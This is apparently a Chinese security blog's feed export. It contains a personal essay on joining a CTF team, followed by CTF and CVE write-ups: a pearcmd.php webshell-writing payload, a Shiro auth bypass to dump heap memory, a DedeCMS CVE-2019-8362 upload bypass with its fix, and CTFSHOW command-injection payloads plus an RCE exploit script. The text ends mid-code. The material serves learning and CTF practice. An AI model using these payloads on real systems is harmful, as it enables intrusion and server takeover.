    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天是Nepnep联合战队的2岁生日，也是我来到这个战队的第8个月，也是我踏入安全这个行业的第8个月，我很笨，别人学习一个小时的知识，我需要学习1小天，前后斟酌了很久也没想好要不要踏入网络安全这一行业，当时我只是一个平平无奇的大二学生，成绩一般，也没什么特长，正在犹豫不决的时候，正好赶上了2021Nepctf，抱着试一试的态度，我参加了比赛，不出所料，差一点连签到都没签上，正好花花在群里招新，我就尝试了一下，感谢Nepnep收留了我，让我这个深处雾里的小菜鸡有了家，有了家就有了依靠，在这个大家庭里我遇到了好多好朋友，博学的傅总，我们的坏女人花花姐，吊毛HRP，吊毛二号阿毛，帅气的爱若，一直想gay我的驹仔，神秘的开心师父，我们的好姐姐贝塔，大坏蛋sharun，神秘的T神等等…很多很多我就不一一列举了，大家一起为自己热爱的拼搏着，一起学习，一起嘻嘻哈哈， 一起打比赛，有苦有乐，有开心也有失落，我们都在慢慢的成长，从一无所知的菜鸡，慢慢能够在比赛中有所输出，还记得在祥云杯熬夜奋战，虽然最后大家没有来到长春会和，但是我们都从失意中获得教训，每次一到大型比赛，就能看到群里大师父们突然出现，扛起大旗，首当其冲，我每每都很羡慕，也很愧疚，难过自己能力不足与帮助战队，也很有压力，大师父们不能一直都在，总有一天大旗会交到我们的手里，所以，我还是要努力学习，快速成长，不辜负前辈的期望。回首这8个月，我收获了知识，收获了荣誉，更重要的是我收获到了一群有着相同爱好的小伙伴和大哥哥大姐姐们，谢谢你们给我帮助和支持，让我在这条路上能够坚持下去，认识我都有点了解，我这个学校几乎没有从事安全行业的同学，如果你们的支持，我可能早就在这条路上放弃了，放弃自己热爱的东西，来思考现实，也感谢一路以来给予我帮助的师傅们，你们没有讨厌我傻x一样的问题，并且能够细心的解答我的困惑，同时我也要感谢一下我的女朋友，她并非计算机专业，却知道我在学习什么从事什么，虽然不能技术上帮助我，但是精神上对我很是支持。我很庆幸我能拥有这么一群好朋友，我也很庆幸我能够被这么多人喜欢，我也很庆幸我有一个知书达理的女朋友，最后希望大家都能够在这条路上越走越好，同时也祝愿Nepnep联合战队两岁生日快乐！</p><p><img src="https://i.loli.net/2021/11/16/DCrFSm19gyq7QvK.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="随笔" scheme="http://h3geeker.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随笔" scheme="http://h3geeker.top/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>2021湖湘杯web部分wp</title>
    <link href="http://h3geeker.top/posts/a17e1508.html"/>
    <id>http://h3geeker.top/posts/a17e1508.html</id>
    <published>2021-11-14T13:30:22.000Z</published>
    <updated>2021-11-14T13:30:58.263Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="easywill"><a href="#easywill" class="headerlink" title="easywill"></a>easywill</h1><p>本人sb，写好的wp被窝删掉了QAQ</p><p>很简单的一道题包含pearcmd.php（审计一下源码就能看到）</p><p>好像竞争上传也可以（没试）</p><p>payload还记得</p><pre class="line-numbers language-none"><code class="language-none">/index.php?+config-create+/&amp;&amp;name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);?&gt;+/tmp/shell.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>写入然后包含一下就行</p><h1 id="Pentest-in-Autumn"><a href="#Pentest-in-Autumn" class="headerlink" title="Pentest in Autumn"></a>Pentest in Autumn</h1><p>给了附件，打开之后发现是shiro框架</p><p><img src="https://i.loli.net/2021/11/14/tqlU8rCFzP4pfdm.png"></p><p>第一反应就是看看有没有actuator未授权访问漏洞</p><p>这样拿到key就可以工具一把梭哈</p><p>访问/actuator路由，有如下内容</p><p><img src="https://i.loli.net/2021/11/14/SifO7gpzloMt9Ay.png"></p><p>继续访问heapdump，发现跳到了404</p><p>到这里卡了很久，后来想到能不能绕过一下</p><p>又看到Shiro &lt; 1.5.2 想到shiro权限绕过 CVE-2020-1957</p><blockquote><p><a href="https://blog.csdn.net/weixin_50464560/article/details/120752809">https://blog.csdn.net/weixin_50464560/article/details/120752809</a></p></blockquote><p>随即构造url</p><pre class="line-numbers language-none"><code class="language-none">/;/actuator/heapdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功下载到heapdump文件</p><p>接下来就是寻找key的过程</p><blockquote><p><a href="https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html">https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html</a></p></blockquote><p>参考此文章利用visualvm工具成功拿到了key</p><p><img src="https://i.loli.net/2021/11/14/tEOx2C4M3a6SBzW.png"></p><p>然后利用shiro attack 工具，一把梭</p><p><img src="https://i.loli.net/2021/11/14/hWaU2dNAVPmnli7.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="wp" scheme="http://h3geeker.top/categories/wp/"/>
    
    
    <category term="大赛wp" scheme="http://h3geeker.top/tags/%E5%A4%A7%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-8362 Dedecms v5.7 sp2 后台文件上传 getshell</title>
    <link href="http://h3geeker.top/posts/f676a4bd.html"/>
    <id>http://h3geeker.top/posts/f676a4bd.html</id>
    <published>2021-11-14T03:35:22.000Z</published>
    <updated>2021-11-14T07:58:22.767Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CVE-2019-8362-Dedecms-v5-7-sp2-后台文件上传-getshell"><a href="#CVE-2019-8362-Dedecms-v5-7-sp2-后台文件上传-getshell" class="headerlink" title="CVE-2019-8362 Dedecms v5.7 sp2 后台文件上传 getshell"></a>CVE-2019-8362 Dedecms v5.7 sp2 后台文件上传 getshell</h1><h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><p>上传zip文件解压缩对于文件名过滤不周，导致getshell</p><h3 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h3><p>Dedecms v5.7 sp2 </p><h3 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h3><p>在<code>dede/album_add.php</code>的175行为上传文件后缀验证</p><p><img src="https://i.loli.net/2021/11/14/pPKNArZE9svTfSO.png" alt="1"></p><p>跟进<code>GetMatchFiles()</code>函数</p><p><img src="https://i.loli.net/2021/11/14/J6oiR1c7jCvbTdx.png" alt="dqd.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GetMatchFiles</span><span class="token punctuation">(</span><span class="token variable">$indir</span><span class="token punctuation">,</span> <span class="token variable">$fileexp</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$filearr</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$dh</span> <span class="token operator">=</span> <span class="token function">dir</span><span class="token punctuation">(</span><span class="token variable">$indir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$dh</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$truefile</span> <span class="token operator">=</span> <span class="token variable">$indir</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"."</span> <span class="token operator">||</span> <span class="token variable">$filename</span> <span class="token operator">==</span> <span class="token double-quoted-string string">".."</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$truefile</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">GetMatchFiles</span><span class="token punctuation">(</span><span class="token variable">$truefile</span><span class="token punctuation">,</span> <span class="token variable">$fileexp</span><span class="token punctuation">,</span> <span class="token variable">$filearr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/\.("</span><span class="token punctuation">.</span><span class="token variable">$fileexp</span><span class="token punctuation">.</span><span class="token double-quoted-string string">")/i"</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$filearr</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$truefile</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$dh</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这行验证中可以看到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/.("</span><span class="token punctuation">.</span><span class="token variable">$fileexp</span><span class="token punctuation">.</span><span class="token double-quoted-string string">")/i"</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只是判断了文件名中是否存在<code>.jpg、.png、.gif</code>中的一个</p><p>我们可以构造<code>1.jpg.php</code>来进行bypass</p><h3 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h3><p>在本地存放一个php探针命名为<code>1.jpg.php</code>将其压缩为zip</p><p>然后在后台的常用操作-文件式管理器处上传压缩文件到soft目录下</p><p><img src="https://i.loli.net/2021/11/14/lrndTkzFwOZcafm.png" alt="firefox_53M4qOUQls.png"></p><p>将<code>1.jpg.zip</code>上传到soft目录</p><p>然后在<code>dede/album_add.php</code>中新建一个图集</p><p><img src="https://i.loli.net/2021/11/14/fOWluxwagpH4vnE.png"></p><p>上传成功后点击预览文档</p><p><img src="https://i.loli.net/2021/11/14/INGW9qvmb72t1PC.png" alt="firefox_4PLbaUquVF.png"></p><p>成功后点击预览中的超链接</p><p><img src="https://i.loli.net/2021/11/14/y3hQ9DpaFribCtM.png" alt="firefox_j83QycVp7F"></p><p><img src="https://i.loli.net/2021/11/14/y3hQ9DpaFribCtM.png"></p><p>成功文件上传，如果将其换成webshell即可getshell</p><h3 id="五、漏洞修复"><a href="#五、漏洞修复" class="headerlink" title="五、漏洞修复"></a>五、漏洞修复</h3><p>1、把/dede/file_class.php中的</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">else if(preg_match("/\.(".$fileexp.")/i",$filename))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$fileexp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token variable">$fileexp</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、及时更新版本</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CVE复现" scheme="http://h3geeker.top/categories/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="CVE漏洞复现 , CVE-2019-8362" scheme="http://h3geeker.top/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-8362/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW命令执行</title>
    <link href="http://h3geeker.top/posts/62244cdb.html"/>
    <id>http://h3geeker.top/posts/62244cdb.html</id>
    <published>2021-11-11T03:35:22.000Z</published>
    <updated>2021-12-10T15:47:56.661Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTFSHOW命令执行"><a href="#CTFSHOW命令执行" class="headerlink" title="CTFSHOW命令执行"></a>CTFSHOW命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>过滤了<code>flag</code></p><p>payload：</p><p>随便写几个姿势</p><pre class="line-numbers language-none"><code class="language-none">/?c=system("nl fl??????");/?c=system("nl fl*");/?c=system("nl fla''g.php");/?c=echo `nl fla""g.php`;/?c=echo `nl fla\g.php`;/?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php/?c=eval($_GET[1]);&amp;1=system('nl flag.php');剩下的我不会了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>##web30</p><p>过滤了<code>flag|system|php</code></p><p>用echo 反引号来执行命令</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=echo `nl fla""g.p""hp`;/?c=echo `nl fla?????`;/?c=echo `nl f*`;/?c=eval($_GET[1]);&amp;1=system('nl flag.php');/?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>过滤了<code>flag|system|php|cat|sort|shell|\.| |   </code></p><p>没关系，我们有都是姿势</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));/?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>##web32</p><p><code>include不用括号，分号可以用?&gt;代替。</code></p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system("cat flag.php");?&gt;/?c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web33-36"><a href="#web33-36" class="headerlink" title="web33-36"></a>web33-36</h2><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system("cat flag.php");?&gt;/?c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==/?c=data://text/palin,&lt;?php system("nl fla*");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p>过滤了<code>flag</code></p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=data://text/palin,&lt;?php%20system("nl%20f*");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>理论上是异或</p><p>然后我懒</p><p>贴exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> recontent <span class="token operator">=</span> <span class="token string">''</span>preg <span class="token operator">=</span> <span class="token string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>preg<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span> <span class="token keyword">or</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>preg<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            k <span class="token operator">=</span> i <span class="token operator">|</span> j            <span class="token keyword">if</span> k<span class="token operator">&gt;=</span><span class="token number">32</span> <span class="token keyword">and</span> k<span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">:</span>                a <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                b <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                content <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span><span class="token operator">+</span> a <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> b <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'rce_or.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token shell-comment comment"># -*- coding: utf-8 -*-</span>import requestsimport urllibfrom sys import <span class="token operator">*</span>import osos<span class="token punctuation">.</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php rce_or.php"</span><span class="token punctuation">)</span>  <span class="token shell-comment comment">#没有将php写入环境变量需手动运行</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"="</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'USER：python exp.py &lt;url&gt;'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"eg：  python exp.py http://ctf.show/"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"="</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>url<span class="token operator">=</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>def <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>    s1<span class="token operator">=</span><span class="token double-quoted-string string">""</span>    s2<span class="token operator">=</span><span class="token double-quoted-string string">""</span>    <span class="token keyword">for</span> i in arg<span class="token punctuation">:</span>        f<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"rce_or.txt"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"r"</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean constant">True</span><span class="token punctuation">:</span>            t<span class="token operator">=</span>f<span class="token punctuation">.</span><span class="token function">readline</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token double-quoted-string string">""</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>                <span class="token shell-comment comment">#print(i)</span>                s1<span class="token operator">+</span><span class="token operator">=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>                s2<span class="token operator">+</span><span class="token operator">=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>                <span class="token keyword">break</span>        f<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    output<span class="token operator">=</span><span class="token double-quoted-string string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token double-quoted-string string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token double-quoted-string string">"\")"</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean constant">True</span><span class="token punctuation">:</span>    param<span class="token operator">=</span><span class="token function">action</span><span class="token punctuation">(</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"\n[+] your function："</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">action</span><span class="token punctuation">(</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token single-quoted-string string">'c'</span><span class="token punctuation">:</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span><span class="token function">unquote</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"\n[*] result:\n"</span><span class="token operator">+</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>exp取自<a href="https://wp.ctf.show/d/137-ctfshow-web-web41/4">https://wp.ctf.show/d/137-ctfshow-web-web41/4</a></p></blockquote><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">/?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><p>/dev/null 2&gt;&amp;1，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p><p><code>%0a</code>、<code>%26</code>、<code>||</code>截断</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=nl%20*%0a= =姿势就不写那么多了截断后看过滤自由发挥<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><p>过滤了<code>;|cat</code></p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=nl%20*%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><p>多过滤了个<code>flag</code></p><p>通配符搞定</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=nl%20*%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p>空格被过滤了</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=nl$IFS*%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web46-49"><a href="#web46-49" class="headerlink" title="web46-49"></a>web46-49</h2><p>过滤了<code>\;|cat|flag| |[0-9]|\\$|\*/</code></p><p>payload：</p><pre class="line-numbers language-none"><code 